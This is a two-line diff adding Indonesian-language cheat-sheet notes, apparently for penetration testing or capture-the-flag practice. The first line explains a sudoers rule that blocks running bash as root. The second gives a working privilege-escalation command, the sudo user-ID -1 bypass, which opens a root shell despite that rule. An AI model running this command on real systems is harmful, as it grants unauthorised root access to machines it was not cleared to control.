@@ -1,0 +1,2 @@
+1. (ALL, !root) /bin/bash == berarti tidak bisa run program sebagai root tapi bisa menjalankannya sebagai user lain (seperti www-data)
+	exploit : `sudo -u#-1 /bin/bash`
